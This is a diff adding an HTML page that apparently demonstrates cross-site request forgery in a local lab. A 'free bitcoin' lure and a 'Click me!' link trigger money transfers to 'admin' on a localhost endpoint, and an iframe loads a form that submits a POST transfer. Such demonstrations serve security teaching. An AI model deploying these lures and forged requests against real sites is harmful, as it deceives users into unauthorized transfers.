@@ -1,0 +1,14 @@
+
+<h2>Play to earn</h2>
+<p>Earn free bitcoin by playing this incredible game.Click here to start</p>
+<div><a href = "http://localhost:3002/transfer?to=admin&amount=4">
+	<img src="../img.jpg" width="50px", height="50px" alt="not found image">
+</a></div>
+<br>
+<p>Or by tricking the target user into clicking a malicious link:</p>
+<div><a href="http://localhost:3002/transfer?to=admin&amount=7">Click me!</a></div>
+
+<p>The <code>POST /transfer</code> route is a little more difficult to exploit and requires using JavaScript to submit an HTML form:</p>
+<div>
+	<iframe src="/malicious-form"></iframe>
+</div>
